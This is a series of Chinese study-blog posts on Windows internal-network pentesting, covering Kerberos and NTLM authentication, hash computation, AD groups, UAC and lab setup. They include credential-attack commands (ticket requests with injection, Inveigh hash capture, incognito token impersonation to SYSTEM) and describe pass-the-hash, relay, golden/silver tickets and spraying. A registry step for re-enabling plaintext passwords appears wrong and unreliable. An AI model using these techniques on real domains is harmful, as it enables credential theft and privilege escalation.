2、ticket：原始的TGT使用krbtgt加密 3、cname：请求用户名 4、sname：请求服务名 TGS-REP ：TGS发送给客户端其中包含大体如下, 1、ticket:内容 2、enc-part：ticket中的part是使用服务秘钥加密内容 3、enc-part：外层的part是使用CT_SK加密 AP-REQ和AP-REP数据包分析 AP-REQ：是客户端发送ST到服务端的数据 AP-REP：是服务端发送到客户端的数据（这个包是可选的） Tgt::ask /user:域用户 /domain:域名 /password:密码 申请TGT tgs::ask /tgt:tgt票据 /service:服务名/域名地址 /ptt 申请ST并且注入到内存 两台试验机 直接访问对方目录是不行的 先把两台电脑缓存的票据清楚 当我们知道域管的账号密码就可以 申请一张tgt 域管票据 成功注入到内存中 成功访问f9f4的目录 之前ntml认证的时候 第四个包应该是传递challenge值的 而这里就是 ptt 1、ticket：里面包含了使用服务端hash加密的内容 2、authenticator：包含了使用CS_SK加密内容 AP-REP，是服务端发送给客户端的信息，包含了客户端验证服务端的信息 kerberos协议安全问题 当我们知道密码hash值就可以传递攻击 PTH 抓包看到了cname 用户名 这里是明文显示的 我们就可以自己枚举用户上传 抓包如果有问题 说明没有这个用户 有的话会显示出来 也可以做喷洒给攻击破密码 AS-REP阶段 当我们知道krbtgt的加密内容我们就可以直接伪造 TGT 也就是黄金票据攻击 TGS-REP阶段 白银票据 伪造ST ","link":"https://f9f.fun/post/nei-wang-xue-xi-day5/"},{"title":"内网学习day4","content":"内网学习day4 Windows本地认证 本地认证概述 本地认证的意思就是，我们的电脑上存储着自己的账号密码，无论电脑是否联网，只 要能开机，就可以输入账号密码登录到电脑中，工作组就是采用本地认证 那么认证流程是什么样子呢？简单流程如下，方便大家看懂 winlogon.exe系统进程 system机器用户自动启动的 Windows Logon Process（即winlogon.exe）：是Windows NT 用户登陆程序，用于管理用户登陆和退出.用 户注销、重启、锁屏后，操作系统会让winlogon.exe显示登陆界面 我们在本地登录输入的账号密码是明文账号密码 而winlogon.exe会把我们的明文账号密码给到 lsass.exe lsass.exe系统也是system机器用户自动启动 lsass.exe会把我们的明文账号密码拿去和SAM文件密码做对比 对比成功则登录成功 lsass.exe适用于微软Windows系统的安全机制，它用于本地安全和登录策略，他不只是用来对比账号密码还有一些其他功能。 SAM文件是位于C\\windows\\system32\\config\\目录下的，用于储存本地所有用户的凭证信息，但 是这并不代表着你可以随意去查看系统密码 SAM文件和lsass.exe进程详解 SAM文件是Windows的用户账户数据库,所有用户的登录名及口令等相关信息都会保存在这 个文件中, 简单如下 用户名称:LM-HASH值:NTLM-HASH值 ------------administrator:LM-HASH:NTLM-HASH 文件中密码不是以明文存在的。 Lsass.exe进程的作用非常重要，它主要负责管理本地安全策略和认证机制。这些策略包 括密码策略、账户策略、用户权限、域策略等等。同时，它还负责对用户进行身份验证， 以确保只有授权的用户才能访问系统资源 1、将winlogon传过来的明文账号密码进行加密，然后和SAM 文件中的密文账号密码作对比。如果对比成功就登陆成功 2、将收到的明文账号密码在本地内存中保留一份用作备用 winlogon---&gt;lsass.exe----&gt;将明文加密后的密文-----&gt;和sam文件中密文对比---还会把传来的明文存在本地内存中一份 ​ LM-Hash加密步骤 Windows操作系统通常使用两种方法对用户的明文密码进行加密处理。一部分为 LM-Hash,另一部分为 NTLM-Hash。在 Windows操作系统中,Hash的结构通常如下: username:RID:LM-HASH:NT-HASH LM Hash的全名为&quot;LAN Manager Hash&quot;,是微软为了提高 Windows操作系统的安全性而采 用的散列加密算法,其本质是DES加密。（DES加密是容易被破解的） 尽管 LM Hash较容易被破解,但为了保证系统的兼容性, Windows只是将LM Hash禁用了(从 Windows vista和 Windows Server2008版本开始, Windows操作系 统默认禁用 LM Hash)。 LM Hash明文密码被限定在14位以内,也就是说,如果要停止使用 LM Hash,将 用 户的密码设置为14位以上即可。 如果 LM Hash被禁用了,攻击者通过工具抓取的 LM Hash通常 为 “aad3b435b51404eead3b435b51404ee”(表示 LM Hash为空值或被禁用) aa开头ee结尾 NTLM Hash是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。 NTLM Hash 是基于MD4加密算 法进行加密的。个人版从 Windows vista以后,服务器版从 Windows Server 2003以后, Windows操作系统的认证方式均为 NTLM Hash 为了解决LM加密和身份验证方案中固有的安全弱点，Microsoft 于1993年在Windows NT 3.1中引 入了NTLM协议。下面是各个版本对LM和NTLM的支持 1、将明文口令转换为其大写形式 假设这里以明文Admin@123为例，转换为大写格式为： Admin@123----&gt; ADMIN@123 2、将字符串大写后转换为16进制字符串 ADMIN@123---&gt; 41 44 4D 49 4E 40 31 32 33 3、密码不足14字节要求用0补全 41 44 4D 49 4E 40 31 32 33---&gt; 41 44 4D 49 4E 40 31 32 33 00 00 00 00 00 00 4、将上述编码分成2组7字节 第一组：41 44 4D 49 4E 40 31 第二组：32 33 00 00 00 00 00 5、将每一组7字节的十六进制转换为二进制，每7bit一组末尾加0，再转换成十六进制 组成得到2组8字节的编码 第一组 第一组：‭01000001010001000100110101001001010011100100000000110001‬ 第二组:‭ 00110010001100110000000000000000000000000000000000000000‬ 第一组： 0100000010100010000100101010100010010100011100100000000001100010 第二组： 001100100001100011000000000000000000000000000000000000000000000‬0 ‭第一组：40A212A894720062‬ 第二组：‭3218C00000000000‬ 6、将以上步骤得到的两组8字节编码，分别作为DES加密key为魔术字符串KGS!@#% 进行 加密 KGS!@#%的16进制为 4B47532140232425 6F08D7B306B1DAD4B75E0C8D76954A50 就是 Admin@123 的LM-HASH值 LM 密码是不区分大小写的 第一步就全转为大写了 NTLM-Hash加密步骤 NTLM-Hash是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。 NTLM Hash 是基于MD4加密算 法进行加密的。个人版从 Windows vista以后,服务器版从 Windows Server 2003以后, Windows操作系统的认证方式均为 NTLM Hash 1、将明文口令转换成十六进制的格式 如：Admin@12 Admin@123---&gt;41646D696E40313233 2、将16进制转换成Unicode格式，即在每个字节之后添加0x00（0的十六进制） 41646D696E40313233--&gt; 410064006D0069006E004000310032003300 3、对Unicode字符串作MD4加密，生成32位的十六进制数字串 570a9a65db8fba761c1008a51d4c95ab 570a9a65db8fba761c1008a51d4c95ab 接下来我们使用一个工具去查看下是否一致 LM-HASH:6F08D7B306B1DAD4B75E0C8D76954A50 NTLM-HASH: 570a9a65db8fba761c1008a51d4c95ab 本地认证中的安全问题 1、如果渗透人员，想知道对方电脑的账号密码，怎么办 SAM文件存着密码，但是是密文的。 lsass.exe进程会存在内存存一份明文密码，通过lsass进程的到明文 进入PE修改SAM文件成自己知道的密码。 删除SAM文件使别人无法登录 2、内存中存储密码很不安全微软肯定会修复，那我我们如何拿到 win10之类电脑的明文账号密码呢？ win 2012之后，win8之后的电脑内存中是不会存明文，但我们可以通过改注册表的方式让他重新存起来 要在Windows 10中启用明文密码存储，可以通过以下步骤修改注册表： 打开注册表编辑器：按下Win + R键，输入&quot;regedit&quot;，然后按Enter打开注册表编辑器。 导航到密码存储位置：在注册表编辑器中，导航到以下路径： HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets 创建新的DWORD值：在右侧窗格中，右键单击空白处，选择&quot;新建&quot;，然后选择&quot;DWORD (32-bit) Value&quot;。 重命名新值：将新值命名为&quot;Secrets&quot;（不包括引号）。 修改新值数据：双击新值，在&quot;数值数据&quot;字段中输入&quot;1&quot;，然后点击&quot;确定&quot;。 重新启动计算机：完成以上步骤后，重新启动计算机使更改生效。 3、既然windows是通过Hash值最对比我能不能直接输入HASH值呢? 4.拿到hash值能否可以得到明文密码 ，可以尝试使用哈希破解工具来对其进行破解。这些工具会尝试对已知的哈希算法进行逆向运算，以找到原始密码。 哈希值破解是指通过对哈希值进行逆向计算，尝试找到原始输入数据的过程。这种破解尝试通常是通过暴力破解或使用预先计算的哈希值表（彩虹表）来实现的。 网络认证 网络认证概述 本地认证的意思就是，我们的电脑上存储着自己的账号密码，无论电脑是否联网，只 要能开机，就可以输入账号密码登录到电脑中，工作组就是采用本地认证 这种情况是不能满足日常需求的。 网络认证：Windows网络认证是指在Windows操作系统中进行网络通信和资源访问时，验证 用户身份和授权权限的过程。它确保只有经过身份验证的用户能够访问网络资源，并根据 其权限级别进行授权操作。 网络认证有哪些？ 1.用户名和密码认证：这是最常见的认证方式，用户需要提供有效的用户名和密码，以验证其身份。这种认证方 式适用于本地计算机账户或域账户。 2.Kerberos认证：Kerberos是一种网络身份验证协议，在Windows域环境中广泛使用。它通过使用票据和票据授 予票证（TGT）来验证用户身份，并生成会话密钥用于加密通信。 3.NTLM认证：NTLM（NT LAN Manager）是一种早期的Windows网络认证协议，它使用基于挑战-响应的方式进 行身份验证。尽管Kerberos已成为首选的认证协议，但NTLM仍然在某些情况下使用，特别是在与旧版Windows 系统或非Windows系统进行互操作时。 4.密钥身份认证：Windows还支持使用密钥来进行身份验证。这种方式涉及使用预先共享的密钥对用户进行身份 验证，通常用于特定的场景和应用。 5.远程桌面认证（Remote Desktop Authentication）：远程桌面是一种远程访问Windows计算机的功能。在远程 桌面连接时，用户需要提供目标计算机的凭据进行认证，以验证身份并获得远程访问权限 ​ 在平时的测试中，经常会碰到处于工作组的计算机，主机A想要访问主机B上的资源，就要向 主机B发送一个存在于主机B上的一个账户，主机B接收以后会在本地进行验证，如果验证成功，才会允 许主机A进行相应的访问。 NTLM（NT LAN Manager）认证是一种早期的Windows网络身份验证协议。它在Windows系 统中用于验证用户的身份，并提供对网络资源的访问控制 远程访问。 NTLM 协议是一种基于挑战（Chalenge）/响应（Response）认证机制 NTLM挑战响应协议认证机制 NTLM 协议挑战Challenge）/响应（Response）认证机制大体如下： 1、协商：这个是为了解决历史遗留问题，也就是为了向下兼容，双方先确定一下传输协议的 版本等各种信息。 2、质询：这一步便是Challenge/Response认证机制的关键之处 3、验证：对质询的最后结果进行一个验证，验证通过后，即允许访问资源 既然是认证我们肯定分为认证失败和认证成功两种 认证成功 1、首先，client会向server发起请求连接协商一些相关东西 2、Server将会本地生成一个(16位或8位)随机字符，即Challenge，并将Chalenge传给client。 qazwsxedcrfvtgby （v1版本8位 v2版本16位） 3、当client接收到Chalenge时，将username的NTLM-hash对Chalenge进行加密、和用 户名、域名、机器名等相关信息，生成Response，并Response发送给server。 4、Server在收到Response后，将其和相同的方式进行加密生成另一个Response，如果 相同，则验证成功，如果不同就失败 认证失败 1、首先，client会向server发起请求连接协商一些相关东西 2、Server将会本地生成一个(16位或8位)随机字符，即Chalenge，并将Chalenge传给client。 3、当client接收到Chalenge时，将username的NTLM-hash对Chalenge进行加密、和用 户名、域名、机器名等相关信息，生成Response，并Response发送给server。 4、Server在收到Response后，将其和相同的方式进行加密生成另一个Response，如果 相同，则验证成功，如果不同就失败 NTML认证抓包分析 接下来我们进行一个实验验证一下我们讲解的步骤并且从数据包的层面进行分析 本次实验采用两台2016的机器进行NTLM认证抓包分析 注意接口要选对 密码就不贴出来了 因为我们用的是net use 走的是smb协议 前四个是协商包 协商用smb2协议 第五个数据包是，用户启动身份的验证包，和一些规则，主要是flag里有相关规则 双击包找到flags 第6个数据包是，有一些包含同意的列表和最最最重要的challenge 可以看到challenge是16位，这 是因为这个采用NTLM v2的协 议，如果是NTLM v1的协议就 是8位 第7个数据包是，是发送Response的数据包，还包含账户名的相关信息 ntml v2 response b1fa5c8685085e06470b6c883e7e1bd301010000000000007bda2594fec5d901a76c982a88bc61580000000002001e00570049004e002d0048005500560055003800470035004b0036004d00510001001e00570049004e002d0048005500560055003800470035004b0036004d00510004001e00570049004e002d0048005500560055003800470035004b0036004d00510003001e00570049004e002d0048005500560055003800470035004b0036004d005100070008007bda2594fec5d90106000400020000000800300030000000000000000100000000200000b1c942b452510458d6b418fda7bc5f261c306f11c48840115d711d6d05dc322e0a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100330031002e00310035003700000000000000000000000000 第8个数据包就是返回节结果，用来表示成功还是失败,失败就是ERROR session setup response 说明成功 总结前四个包进行协商 第五个包 是协商完后发送一些规则 第六个包 challenge 第七个包 response 第八个 结果 Challenge和Response分析 https://davenport.sourceforge.net/ntlm.html Challenge是服务端发送给客户端的一串随机的字符，NTLM-v1协议中是8位，NTLM-v2协议中 是16位，自从Windows vista 之后就开始默认使用V2协议了 challeng值是随机的 Response值是客户端生成的发送给服务端，用来进行校验的 Response是如何生成的呢？ 他是由 Response =NTProofStr+blob两部分拼接起来的 1、NTProofStr : NTLM-v2-Hash值 和 challenge+blob 进行 HMAC-MD5加密 NTLM-v2-Hash: 大写的用户名+域名编码成unicode格式，然后和密码的NTLM-Hash值 进行HMAC-MD5加密 2、 blob是由时间，目标信息，随机填充字符等生成。 我们平时在使用工具进行攻击的时候抓到的都是Net-NTLM Hash个数据： username::domain:challenge: NTProofStr :blo response=NTProofStr+blob **NTProofStr=NTLM-V2-HASH +（challeng+blob）**进行HMAC-MD5加密 NTLM-V2-HASH=unicode（username+domain）进行HMAC-MD5 NTLM-HASH blob 随机 Net-NTLM Hash：username：domain：challenge：NTProofStr：blob 我们使用工具进行抓取Net-NTLM v2 Hash 格式为： username:domain:challenge:NTProofStr :blob Import-Module .\\Inveigh.ps1 Invoke-Inveigh -ConsoleOutputY -FileOutput y net use \\192.168.131.157 /u:administrator xxxxxx 我自己抓取是失败了 我这里展示的是别人成功的 计算： NTLM-v2-Hash 1、首先将administrator转成大写：ADMINISTRATOR 2、然后将BM-2008联合起来： ADMIN@123BM-2008 3、转成16进制：41444d494e4953545241544f52424d2d32303038 5、转成unicode格式： 410044004D0049004E004900530054005200410054004F00520042004D002D003200300030003800 6、使用密码和NTLM-Hash值： 570a9a65db8fba761c1008a51d4c95ab（作为key） 和上述进行HMAC- MD5加密 7、得到结果 236400794877e95f36a02f369f45ee16 NTLM-v2-Has 计算： NTProofStr 1、首先将NTLM-v2-Hash 作为key：236400794877e95f36a02f369f45ee16 2、 challenge+blob 加起来： B5D452A6509B46E40101000000000000839015126990D90172B4512C2F4B F1080000000002000E0042004D002D00320030003000380001000E004200 4D002D00320030003000380004000E0042004D002D003200300030003800 03000E0042004D002D00320030003000380007000800839015126990D901 0600040002000000080030003000000000000000000000000030000007CD FF2CD4739540D80B3F01668B69F29BBE8F014CC625EE38BBBAC47EE30882 0A00100000000000000000000000000000000000090026006300690066007 3002F003100390032002E003100360038002E00340031002E003200330039 00000000000000000000000000 3、 NTLM-v2-Hash作为key对上述数据进行HMAC-MD5进行加密，得到 Becd7c318deacba635c398cd7b679cf8 （ NTProofS） 得到Response值 Becd7c318deacba635c398cd7b679cf80101000000000000839015126990D 90172B4512C2F4BF1080000000002000E0042004D002D003200300030003 80001000E0042004D002D00320030003000380004000E0042004D002D003 20030003000380003000E0042004D002D003200300030003800070008008 39015126990D9010600040002000000080030003000000000000000000000 000030000007CDFF2CD4739540D80B3F01668B69F29BBE8F014CC625EE38 BBBAC47EE308820A00100000000000000000000000000000000000090026 0063006900660073002F003100390032002E003100360038002E003400310 02E00320033003900000000000000000000000000 NTLM协议安全问题 NTLM协议安全问题 1、PTH 攻击：因为NTLM认证过程中使用到用户的NTLM-hash值计算，如果说 我们的知道对方电脑的Hash值就可以进行PTH攻击 当我们知道密码的hash值 我们就可以生成NTLM-V2-Hash （NTLM-v2-Hash: 大写的用户名+域名编码成unicode格式，然后和密码的NTLM-Hash值 进行HMAC-MD5加密） 生成NTLM-V2-Hash 我们就可以先发送一个包获取到challenge 然后伪造好response 2、NET-HTLM hash relay攻击：NTLM中间人攻击、如果获得Net-NTLM v1 Hash 可以重放，进行认证 如果我们获取到如图内容 我们直接发送给需要认证电脑就可以了 3、 Net-NTLM v1 v2 Hash 破解： v1比较简单，容易破解使用DES，如果是V2 就要使用碰撞的方式可以使用彩虹表或者暴力猜解等方式，获取明文的账号密码 如果抓取到hash，我们还可以直接破解hash获取到明文账号密码 NTLMv1和NTLMv2的区别 NTLMv1和LTLMv2的区别 Challenge值不同： NTLMv1：challenge值是8位 NTLMv2：challenge值是16位 Response生成不同 Response加密不同 NTLMv1： 1、将用户的NTLM HASH填充为42位 2、分为3组，每组14位 3、每组分别对challenge进行EDS加密 4、拼接起来就是response V2: username::domain:challenge:NTProofStr :blob V1: username::hostname:LM response:NTLM response:challen 如果要更改认证方式，在计算机本地安全策略中设置 总结 1、LM-Hash：针对早期windows用户密码进行加密的哈希值，他是一段hash值 2、NTLM-Hash: 针对目前windows用户密码进行加密的哈希值，他是一段hash值 3、NTLM协议认证：他是一种认证方式，用来建立两台电脑的信任，分为NTLM-v1协议和 NTLM-V2,是协议 4、 NTLM-v2-Hash :是在NTLM-v2认证过程中的一段加密的 哈希值 5、 Net-NTLM v1 Hash 是由不同的字段组成的值，用来电脑进行对比 ","link":"https://f9f.fun/post/nei-wang-xue-xi-day4/"},{"title":"内网学习day3","content":" AD活动目录介绍 活动目录（Active Directory，AD）是指域环境中提供目录服务的组件，目录用于存储有关网络对象（例如用户、组、计算机、共享资源、打印机、和联系人等）的信息。目录服务是指帮助 用户快速、准确地从目录中找到其所需要的信息服务。活动目录实现了 目录服务，为企业提供了网络环境的集中式管理机制。 AD可以做到 统一修改密码 安装打印机 安装杀软等 域内计算机 昨天添加的两台 domain controller 就一台DC 这里我就简单学习一下 会一些基本操作就ok 组织单元介绍 组织单元（OU）是域中包含的一类目录对象如用户、计算机和组、文件与打印机等资源，是一个容器，可以再OU上部署组策略 这里我新建了一个组织单元 AAA组织单元又可以进行其他操作比如新建一些用户 导入一些计算机之类的 我们可以再AD上创建公司各个部门的组织单元然后把部门内的计算机移入到对应的组织单元，便于去管理 创建组织单元 然后又可以再组织单元内新建用户 密码qwertyuio.123456789 如果离职就可以在这禁用账号 他就无法登录了 域信任关系解读 信任关系解读 域是安全边界，若无信任关系，域用户帐户只能在本域内使用。信任关系在两个域之 间架起了一座桥梁，使得域用户帐户可以跨域使用 abc.com 和 xyz.com 域如果有信任关系 则a域内的账号可以直接跨到x域 信任关系分为：可传递的和不可传递的。 可传递：如果A域和B域之间的信任是可传递的,B域和C域之间的信任也是可传递的，那么A域和C域之 间就自动创建了信任关系。 不可传递：如果A域和B域之间的信任是不可传递的,或者B域和C域之间的信任是不可传递的， 那么A域和C域之间不会自动创建了信任关系 可传递和不可传递我们是可以人为去设置的。 单双向信任关系 单向信任是在两个域之间创建的单向信任。这表示在域 A 和域 B 之间的单向信任中， 1、域 A 中的用户可以访问域 B 中的资源。 2、域 B 中的用户无法访问域 A 中的资源。 单向信任可以是不可传递信任，也可以是可传递信任，这取决于创建的信任类型 双向信任关系 林（域树）中的所有域信任都是双向的、可传递的信任。创建新的子域时，系统将在新的子域 和父域之间自动创建双向可传递信任。在双向信任中，域 A 信任域 B，并且域 B 信任域 A。这 表示可以在两个域之间双向传递身份验证请求。 内部信任 内部信任是指在同一个林中域之间的信任关系，这种信任关系是可传递的 外部信任 外部信任指不同林之间域的信任关系，这种信任关系是单向或者双向不可传递的 工作组权限 本地用户组介绍 电脑的身份就是两种，第一种是本地工作，第二种是域，我们默认的电脑都是本地工作 组的形式。 本地工作组的电脑，所有的账号密码，群组等都存放在本地的电脑文件中，不管电脑有 没有网络，只要能开机，我们输入本地的账号密码都可以登录到电脑。 在电脑中一般有两种角色，一个是用户一个是组，一个组中可以有多个用户， 一个用户可以 属于多个组，通过给组划分不同的权限，用户就有了不同的权限 可以吧家庭理解成一个组，家庭里的成员就是组里的用户 这些事默认的一些组 这些组或是用户都是存放在本地 本地最高管理员权限 Administrator原意为管理人或行政官员或遗产管理人，在计算机名词中,它的意思是系统超级管理员或超 级用户，注意以下几点 1、Administrator用户在家庭版的电脑中是属于禁用的状态，在专业版中属于开启的状态，在server机器 中属于开启 2、Administrator用户的SID 最后一位是500 3、Administrator 用户默认在administrators组中 可以看administrator用户的sid最后是500 本地普通管理员权限 本地一般管理员就是加入了administratorts组的管理员但不是administrator用户 比如说fwl1 虽然也在administrator组中 但他是本地普通管理员权限 有些命令执行不了 当前我是administrator登录 可以直接执行添加用户命令 可以看到成功添加 现在我把刚才创建的fff用户添加的administrators组中 然后我切换用户到fff 来看看普通管理员和最高管理员有啥区别 这时候我添加用户是不可以的 即是我在administrators组中 这是因为UAC认证 当我们用管理员权限运行cmd或者PS时就可以执行上述命令 这时候可以看到system32 admin用户虽然也是管理员，但是有些操作也是执行不了的，因为有UAC 如果要执行高权限的操作必须右键使用管理员打开 本地普通用户 本地普通用户，就是在windows电脑中本地新建的普通用户。没有管理员的权限，一般很多操作 执行不了，需要管理员认证后才可以执行，以下是windows用户组，新建的用户一般默认是user 组 刚才我们新建的abc 用户是在user组中 现在我切换到abc用户 当本地普通用户权限以管理员身份运行PS时需要输入administrator的密码 且防火墙也是无法关闭 当我们进行高权限的操作时候会出现以下的认证（需要输入管理员的账号和密码才可以） 这时候就需要提权 UAC认证 UAC认证是什么 UAC（User Account Control），中文翻译为用户帐户控制，是微软在Windows Vista和Windows7中引用的 新技术，主要功能是进行一些会影响系统安全的操作时，会自动触发UAC，用户确认后才能执行。因为大部 分的恶意软件、木马病毒、广告插件在进入计算机时都会有如：将文件复制到Windows或Program Files等目 录、安装驱动、安装ActiveX等操作，而这些操作都会触发UAC，用户都可以在UAC提示时来禁止这些程序的 运行 许可提示当用户尝试执行需要用户管理访问令牌的任务时，会显示同意提示。 下面是 UAC 同意提示的示例 凭据提示当标准用户尝试执行需要用户管理访问令牌的任务时，会显示凭据提示。 还可以要求管理员提供其凭据 普通管理员会有许可提示 只要选则是或否 而普通用户则会受到凭据提示 需要输入管理员的账号密码进行认证 如果我们控制的是admin用户那绕过UAC是很简单的，但如果是普通用户则绕过UAC比较困难，可能需要借助内核漏洞 UAC的触发条件： 修改Windows Update配置； 增加或删除用户帐户； 改变用户的帐户类型； 改变UAC设置； 安装ActiveX； 安装或卸载程序； 安装设备驱动程序； 修改和设置家长控制； 增加或修改注册表； 将文件移动或复制到Program Files或是Windows目录； 访问其他用户目录 UAC有用四种设置要求 简单来说，UAC设置分四种，分为始终通知、仅在程序尝试对我的计算机进行更改时通知我、仅当程序 尝试更改计算机时通知我（不降低桌面亮度）和从不通知。输入W+R --msconfig 设置UAC 如果你设置了不弹窗普通管理员会不弹出许可提示，但普通用户仍会弹出凭证提示需要输入密码， UAC认证还是在 知识不弹框 本地系统最高权限system SYSTEM的中文意思是系统，在Windows中主 要作为系统服务或进程的运行账户 system是电脑自动启动的 有些恶意软件就是system权限启动 会比较隐蔽 Administrator和system权限区别 并不是说System比Administrator权限大，这两个用 户的区别是 Administrator是系统内置的管理员用户， 一般平时安装、运行程序、修改系统设置等都是 以这个权限身份运行的 。 System权限是系统本身的权限，比如任 务管理器里面的winlogon.exe、svchost.exe、 alg.exe这些进程等等，另外，注册表里面某些地 方只有系统自己可以访问，Administrator用户也不 能访问 域内机器权限 域内用户组介绍 机器加入到域，使用域内的用户进行登录，域内用户的信息存放在域控（DC）上，添加用 户或者修改密码登操作都在域控上执行 管理员组( Administrators)的成员可以不受限制地存取计算机/域的资源。它不仅是最具权力的一个组,也是在 活动目录和域控制器中默认具有管理员权限的组。该组的成员可以更改 Enterprise Admins、 Domain admins 组的成员关系,是域森林中强大的服务管理组 administrators组 域管理员组( Domain Admins) 指定的域管理员,拥有完整的管理员权限。因为该组会被添加到自己所在域的 Administrators 组中,因此可以继承 Administrators组的所有权限。同时该组默认会被添加到每台域成员 计算机的本地 Administrators组中, 这样, Domain admins组就获得了域中所有计算机 当这台电脑被升级为域控机 domain admins 会被添加到administrators组中 如果电脑在domain admins组中 那他就是这台电脑的本地管理员 当我把f9f1加入到domain admins中 那f9f1这个用户就是域控制器上的管理员，也就相当于属于administrators组，就是普通管理员 域管理员组( Domain Admins) 指定的域管理员,拥有完整的管理员权限。因为该组会被添加到自己所在域的 Administrators 组中,因此可以继承 Administrators组的所有权限。同时该组默认会被添加到每台域成员 计算机的本地 Administrators组中, 这样, Domain admins组就获得了域中所有计算机的所有权。 在加入域的电脑本地administrator组中多了一成员 domain admins 问题？ 如果我要添加一个域管理员，是 添加到域控Administrators组还是 Domain Admins 答：添加到domain admins组中；添加到administrator组中他只是这台域控制器的管理员 企业系统管理员组 ( Enterprise Admins)是域森林或者根域中的一个组。该组在域森林中的 每个域内都是 Administrators组的成员,因此对所有域控制器都有完全访问权 只是针对域控制器 域用户组 ( Domain users)中是所有的域成员。在默认情况下,任何由我们建立的用户账号 都属于 Domain Users组,该组在域内机器中存在于 Users Domain Computers组 Domain Computers组，任何由我们建立的计算机账号都属于该组 机器加入到域之后可以选择使用域内用户登录，也可以使用本地用户登录，注意以下的区别 1、本地用户登录，是存放在本地文件中然后本机进行校验。域内用户登录，是要通过DC的认证之 后才能登录，用户信息存放在域控上 2、本地用户登录主要是对比NTLM HASH值，域认证是通过kerberos认证 3、机器可以选择本地登录或者域用户登录，本地用户 机器名\\用户名，域内用户 域名\\ 这样就是本地用户登录 这样就是域内用户登录 域控机关机的时候，域内主机就无法域内登录，因为DC无法认证， 所以一般需要备份DC防止DC坏了 域内最高管理员权限 域内最高管理员权限是 域名\\administrator,他没有UAC认证，他也是每个域内机器的本地管理员，和机 器名\\administrator 具有相同的权限，SID也是500 本地管理员 是可以创建用户的 只不过我这里密码不符合 我也就不去在创建了 现在我切换域管理员 sid最后也是500 两者都是不需要UAC认证 域内普通管理员 域内普通管理员就是加入了域中的Domain Admins组，但不是administrator用户 fff用户隶属于administrator 切换fff登录 sid不是五百 1001 因为我添加fff用户到administrator组所以弹窗认证只需要许可就行，并不需要凭据也就是不需要输入管理员账号密码。 可以看到现在是system32最高权限是可以执行添加用户等一系列操作 或者把用户添加到 domain admin组中也是有同样的效果，都是普通管理员权限 域内普通用户 域用户组( Domain users)中是所有的域成员。在默认情况下,任何由我们建立的用户账号 都属于 Domain Users组,该组在域内机器中存在于 Users 我先创建一个用户 123 密码 Abc@.qwer 那现在123 就是本地一个普通用户 我们切换到123 无法创建用户 且用管理员身份执行需要凭据认证 这里的认证可以输本地管理员账号密码，也可以输域管的账号密码 我们输domain admin中的f9f1看看可不可以 也是可以 可以看到域内用户有这几个 我用f9f2用户登录2008的机子 也是可以登录的 domain user组中的用户在 可以看到本地user组中有domain user 所以只要是是domain user组中的用户登录都有本地user的权限 他就相当于本地的普通用户权限，执行高操作的时候需要UAC认证 同上述。域内普通用户 机器用户和system区别 Domain Computers组，任何由我们建立的计算机账号都属于该组,机器账户是指在网络中用于代表计算 机或设备的账户。在Windows域环境中，每台计算机都有一个机器账户，用于在网络中进行身份验证和 授权。机器账户的名称通常以计算机名称或计算机GUID作为前缀，如“ZS-PC$&quot;。机器账户与具体计算机 相关联，用于代表计算机进行域认证和访问域资源 SYSTEM的中文意思是系统，在Windows中主 要作为系统服务或进程的运行账户 当电脑加入到域中后机器账号的密码或同步到域控上，所以说本地system用户对应域内的机器用户， 如果说我们渗透的电脑加入了域，但是使用本地用户进行登录，我们就可以提权到system用户，然后对域内进 行查询 虽然&quot;System&quot;账户是本地计算机上的特殊账户，而机器账户是域环境中的账户，但在某些情况下，例 如当本地计算机需要访问域资源时，&quot;System&quot;账户可能会充当机器账户的角色。这是因为在域环境中，本地计 算机可以使用&quot;System&quot;账户作为其身份进行域认证和访问授权。但需要明确的是，它们仍然是两个不同的概念， &quot;System&quot;账户不是专门为域中的机器账户而创建的 f9f2是域内的用户并非本地用户。 域内用户是可以做查询域内成员等操作。 现在切换到本地用户 本地用户是查询不到的。 这个时候就需要上述提到的 system用户 这是因为在域环境中，本地计 算机可以使用&quot;System&quot;账户作为其身份进行域认证和访问授权 如何提升到system用户 这里用到一个工具 incognito.exe 具体使用如下 先incognito.exe list_tokens -u 列举出了tokens incognito.exe execute -c &quot;NT AUTHORITY\\SYSTEM&quot; CMD 用system的令牌执行cmd 这样就提到了system权限了 就可以做域内查询操作了 ","link":"https://f9f.fun/post/nei-wang-xue-xi-day3/"},{"title":"内网学习day2","content":"DC域控 一般一个地理位置固定额小公司里，建立一个域就可以满足需求。在一个域内，一般 至少有两台域服务器，一台作为DC，另一台作为备份DC 一般在内网渗透中，我们都是找DC服务器 域环境搭建 通常说的内网渗透测试，很大程度上就是域渗透，搭建域渗透测试环境，对我们来说非常的重要，只有搭建域环境才能更好地学习内网渗透。 开始搭建 首先确认下载的系统 我这是 我这里不设置备份DC 然后去msdn下载操作系统 MSDN, 我告诉你 - 做一个安静的工具站 (itellyou.cn) 下载好后开始搭建 DC机器搭建 首先搭建的是DC机器 设置服务器 DC机ip 192.168.131.150 域控IP地址设置好了 更改计算机名 改为DC 然后重启 安装域控服务器和DNS服务 找到服务器面板 点击添加角色和功能 这里一定要安装AD域服务和DNS服务器 其他随意 然后一直下一步 最后安装 安装好后点击这 将此服务器升为域控制器 我们这直接新建一个域 就是添加新林 域名随意设置 下一步 设置密码 然后一直下一步 安装 安装完后 会自动重启 域内主机搭建 先新建从msdn上下载的 windows 2008 先改ip 需要在同一个网段下 dns服务器需要时dc机的ip 这里域先不用去点 先把名字改了 重启后查看ip 然后ping一下f9f.com我们设置的域 可以ping通 正确反回了域控ip 并且我域控机的防火墙是开着的 加入域和退出域 给window是 2008 创建用户创建域控制器账户 下一步然后完成 可以看到已经f9f1 普通用户创建成功 现在我们登录2008的机器 加入域 这里要输入的用户密码 是域控DC管理员的账号密码 administrator 然后重启电脑 成功加入 我们这里先不管 先用之前的用户登录 就是之前我们在dc上创建的用户 whoami 可以看到我们已经是f9f域下的了 现在我们把2003的机器也设置好 我这里下了2016 直接设置2016 好了 都一样 等待安装好 步骤和之前一样先改ip 192.168.131.30 再改计算机名 重启 以f9f2的身份登录2016 这些都是加入域 退出域 同样是打开计算机属性面板 点击更改设置 但是这里会要求你输入管理员账号密码 因为你此时是以 f9f1 的身份登录的 这时候你把隶属于选到工作组 然后工作组名称随便输一个 ，这时候你就自动退出域了。 